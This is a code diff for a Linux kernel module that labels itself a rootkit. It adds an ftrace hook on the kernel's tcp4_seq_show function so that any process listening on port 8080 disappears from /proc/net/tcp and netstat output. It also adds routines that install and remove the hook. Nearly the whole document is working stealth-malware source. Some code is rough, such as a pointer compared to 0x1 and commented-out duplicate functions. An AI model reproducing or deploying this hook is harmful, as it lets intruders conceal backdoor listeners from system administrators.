@@ -8,7 +8,6 @@
 #include <linux/kallsyms.h>
 #include <linux/seq_file.h>
 #include <linux/namei.h>
-#include "seq.h"
 #include <linux/ftrace.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
@@ -22,7 +21,20 @@
     .original = (_orig),        \
 }
 static asmlinkage long (*org_tcp4_seq_show)(struct seq_file *seq, void *v);
-static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v);
+static void netstat_unhide(void);
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    long ret;
+    struct sock *sk = v;
+    if (sk != 0x1 && sk->sk_num == 0x1f90)
+    {
+		printk(KERN_ALERT "rootkit: Found process listening on port 8080 - hiding!\n");
+		return 0;
+	}
+    ret = org_tcp4_seq_show(seq, v);
+    return ret;
+
+}
 
 struct ftrace_hook {
 	const char *name;
@@ -65,7 +77,8 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
 
 	return 0;
 }
-static int install_hook(struct ftrace_hook *f_hook)
+
+static int netstat_install_hook(struct ftrace_hook *f_hook)
 {
     int ret;
     //fill the structs
@@ -99,6 +112,34 @@ void fh_remove_hook(struct ftrace_hook *hook)
 		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
 	}
 }
+struct ftrace_hook tcp4_hook = HOOK("tcp4_seq_show", hook_tcp4_seq_show, &org_tcp4_seq_show);
+/*
+static int netstat_hide(void)
+{
+    int ret;
+    ret = install_hook(&tcp4_hook);
+    //ret = set_ops("/proc/net/tcp");
+    printk(KERN_ALERT "set ops done, ret equals to : %d", ret);
 
-                                                
+    return 0;
+}
+static void netstat_unhide(void)
+{
+    fh_remove_hook(&tcp4_hook);
+} */   
+
+
+static int netstat_hide(void)
+{
+    int ret;
+    ret = netstat_install_hook(&tcp4_hook);
+    //ret = set_ops("/proc/net/tcp");
+    printk(KERN_ALERT "set ops done, ret equals to : %d", ret);
+
+    return ret;
+}
+static void netstat_unhide(void)
+{
+    fh_remove_hook(&tcp4_hook);
+}                                           
 #endif
